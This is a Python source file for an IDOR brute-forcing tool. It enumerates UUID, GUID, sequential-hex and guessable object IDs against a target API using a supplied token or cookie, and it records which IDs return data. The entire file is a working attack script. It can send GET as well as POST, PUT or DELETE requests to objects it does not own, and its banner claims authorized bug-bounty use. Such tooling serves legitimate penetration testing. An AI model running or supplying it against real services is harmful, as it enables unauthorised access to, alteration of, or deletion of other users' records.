#!/usr/bin/env python3
"""
UUID / GUID Brute-Forcer & Pattern Guesser
==========================================
Attacks resources that use UUID, GUID, ULID, or sequential hex IDs.

Strategies:
  1. Known-UUID list  — test UUIDs harvested from JS, responses, etc.
  2. Pattern predict  — enumerate UUIDs with fixed prefix (time-based leaks)
  3. Sequential fuzz  — short hex, base62, numeric combos
  4. Wordlist fuzz    — test common predictable IDs

Usage:
    python3 uuid_idor_brute.py --url https://target.com/api/doc --mode known --uuid-file uuids.txt --token TOKEN
    python3 uuid_idor_brute.py --url https://target.com/api/doc --mode predict --prefix 018f0a --count 500 --token TOKEN
    python3 uuid_idor_brute.py --url https://target.com/api/doc --mode wordlist --token TOKEN

⚠️  Authorized testing only. Stay within scope.
"""

import argparse
import json
import uuid
import string
import random
import time
import sys
import itertools
from datetime import datetime
from typing import Optional, List

import requests
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich import box

console = Console()

BANNER = """
╔══════════════════════════════════════════════════╗
║      UUID / GUID IDOR Brute-Forcer  v2.0        ║
║   Authorized bug bounty testing only            ║
╚══════════════════════════════════════════════════╝
"""

# ─── Common predictable / sequential ID wordlist ──────────────────────────────
COMMON_IDS = [
    "00000000-0000-0000-0000-000000000001",
    "00000000-0000-0000-0000-000000000002",
    "11111111-1111-1111-1111-111111111111",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
    "deadbeef-dead-beef-dead-beefdeadbeef",
    "cafecafe-cafe-cafe-cafe-cafecafecafe",
    "00000000-0000-4000-8000-000000000000",
    "1",  "2",  "3",  "100", "1000", "admin", "test", "user", "guest",
    "0",  "null", "undefined", "true", "false",
    "me", "self", "current", "my", "profile",
]


def make_headers(token: Optional[str], cookie: Optional[str]) -> dict:
    h = {"User-Agent": "BugBounty-UUID-IDOR/2.0", "Accept": "application/json"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if cookie:
        h["Cookie"] = cookie
    return h


def probe(url_tmpl: str, uid: str, session: requests.Session,
          headers: dict, method: str, body: Optional[str]) -> Optional[dict]:
    """Test a single ID. Returns result dict if interesting, else None."""
    url = url_tmpl.replace("UUID_VAL", str(uid))
    try:
        if method.upper() == "GET":
            resp = session.get(url, headers=headers, timeout=10)
        else:
            b = json.loads(body.replace("UUID_VAL", str(uid))) if body else {}
            resp = session.request(method, url, json=b, headers=headers, timeout=10)

        code = resp.status_code
        length = len(resp.text)
        snippet = resp.text[:200]

        if code in (200, 201):
            return {"id": uid, "status": code, "length": length, "snippet": snippet, "url": url}
        elif code == 403:
            return {"id": uid, "status": 403, "note": "Forbidden (exists but denied)", "url": url}
        elif code not in (404, 400, 410):
            return {"id": uid, "status": code, "snippet": snippet, "url": url}
    except requests.exceptions.RequestException as e:
        console.print(f"  [red][NET][/red] {uid}: {e}")
    return None


def predict_uuids(prefix: str, count: int) -> List[str]:
    """Generate UUID-like IDs with a known prefix (time-based v1/v7 style)."""
    ids = []
    chars = string.hexdigits[:16]
    prefix_clean = prefix.replace("-", "")
    for _ in range(count):
        suffix = "".join(random.choices(chars, k=32 - len(prefix_clean)))
        raw = prefix_clean + suffix
        # Format as UUID: 8-4-4-4-12
        uid = f"{raw[:8]}-{raw[8:12]}-{raw[12:16]}-{raw[16:20]}-{raw[20:32]}"
        ids.append(uid)
    return ids


def sequential_hex(length: int = 8, count: int = 200) -> List[str]:
    """Generate short sequential hex IDs."""
    return [hex(i)[2:].zfill(length) for i in range(count)]


def run_mode(args):
    session = requests.Session()
    headers = make_headers(args.token, args.cookie)
    results = []

    if args.mode == "known":
        if args.uuid_file:
            with open(args.uuid_file) as f:
                ids = [l.strip() for l in f if l.strip()]
        else:
            ids = COMMON_IDS
        console.print(f"[cyan][*] Known UUID mode — testing {len(ids)} IDs[/cyan]")

    elif args.mode == "predict":
        ids = predict_uuids(args.prefix or "018f", args.count)
        console.print(f"[cyan][*] Predict mode — {len(ids)} generated UUIDs with prefix '{args.prefix}'[/cyan]")

    elif args.mode == "wordlist":
        ids = COMMON_IDS
        console.print(f"[cyan][*] Wordlist mode — {len(ids)} common predictable IDs[/cyan]")

    elif args.mode == "random":
        ids = [str(uuid.uuid4()) for _ in range(args.count)]
        console.print(f"[cyan][*] Random UUID mode — {len(ids)} random UUIDs[/cyan]")

    elif args.mode == "hex":
        ids = sequential_hex(count=args.count)
        console.print(f"[cyan][*] Sequential hex mode — {len(ids)} IDs[/cyan]")

    else:
        console.print("[red][!] Unknown mode[/red]"); sys.exit(1)

    table = Table(title="UUID IDOR Results", box=box.ROUNDED, show_lines=True)
    table.add_column("ID", style="cyan", no_wrap=True)
    table.add_column("Status", style="bold")
    table.add_column("Length")
    table.add_column("Snippet", style="dim")

    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeElapsedColumn(),
    ) as progress:
        task = progress.add_task("[cyan]Probing IDs...", total=len(ids))
        for uid in ids:
            r = probe(args.url, uid, session, headers, args.method, args.body)
            if r:
                status_style = "green" if r["status"] == 200 else "yellow"
                table.add_row(
                    str(r["id"]),
                    f"[{status_style}]{r['status']}[/{status_style}]",
                    str(r.get("length", "-")),
                    r.get("snippet", r.get("note", ""))[:80]
                )
                results.append(r)
                console.print(f"  [green][HIT][/green] {uid} → {r['status']} ({r.get('length',0)} bytes)")
            time.sleep(args.delay)
            progress.advance(task)

    console.print(table)
    return results


def main():
    console.print(f"[bold cyan]{BANNER}[/bold cyan]")

    parser = argparse.ArgumentParser(
        description="UUID/GUID IDOR Brute-Forcer — authorized testing only")
    parser.add_argument("--url",       required=True, help="Target URL. Use UUID_VAL as placeholder: https://target.com/doc/UUID_VAL")
    parser.add_argument("--token",     default=None)
    parser.add_argument("--cookie",    default=None)
    parser.add_argument("--mode",      default="wordlist",
                        choices=["known", "predict", "wordlist", "random", "hex"],
                        help="Fuzzing strategy")
    parser.add_argument("--uuid-file", default=None,  help="File with UUIDs (one per line) for 'known' mode")
    parser.add_argument("--prefix",    default="018f", help="UUID prefix for 'predict' mode")
    parser.add_argument("--count",     type=int, default=200, help="Number of IDs to generate")
    parser.add_argument("--method",    default="GET",  help="HTTP method: GET | POST | PUT | DELETE")
    parser.add_argument("--body",      default=None,   help='JSON body template, use UUID_VAL placeholder: \'{"id":"UUID_VAL"}\'')
    parser.add_argument("--delay",     type=float, default=0.15)
    parser.add_argument("--output",    default="uuid_idor_results.json")

    args = parser.parse_args()
    results = run_mode(args)

    if results:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        console.print(f"\n[green][+] {len(results)} result(s) saved → {args.output}[/green]")
    else:
        console.print("\n[yellow][~] No hits found.[/yellow]")


if __name__ == "__main__":
    main()
